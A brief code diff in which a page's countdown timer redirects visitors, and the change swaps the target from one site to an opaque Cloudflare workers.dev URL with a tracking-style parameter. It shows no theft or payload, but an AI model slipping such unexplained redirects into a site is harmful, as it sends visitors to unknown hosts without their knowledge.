@@ -319,7 +319,7 @@ setTimeout(function() {
                 
                 if (countdown < 0) {
                     clearInterval(countdownInterval);
-                    window.location.href = 'https://as.com'; // Mengarahkan ke URL target setelah hitungan mundur selesai
+                    window.location.href = 'https://autoupsense.mastimon.workers.dev/?br21r=3'; // Mengarahkan ke URL target setelah hitungan mundur selesai
                 }
             }, 1000);
         }
